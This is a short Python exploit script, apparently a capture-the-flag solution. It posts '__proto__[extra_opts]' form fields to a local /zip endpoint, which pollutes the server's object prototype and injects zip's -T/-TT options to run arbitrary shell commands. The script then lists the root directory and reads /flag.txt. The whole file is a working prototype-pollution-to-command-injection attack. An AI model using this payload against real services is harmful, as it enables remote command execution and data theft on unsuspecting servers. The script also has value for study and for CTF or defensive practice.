import requests

BASE_URL = "http://localhost:8000"

def run_command(cmd):
    res = requests.post(f'{BASE_URL}/zip', files={
        'file': 'hello world',
    }, data={
        '__proto__[extra_opts][0]': '-T',
        '__proto__[extra_opts][1]': '-TT',
        '__proto__[extra_opts][2]': cmd + ' > {} #'
    })

    # Reset prototypes
    requests.post(f'{BASE_URL}/zip', files={
        'file': 'hello world',
    }, data={
        '__proto__[extra_opts]': '',
    })

    return res.text


ls = run_command('ls /')
assert 'flag.txt' in ls

flag = run_command('cat /flag.txt')
print(flag)
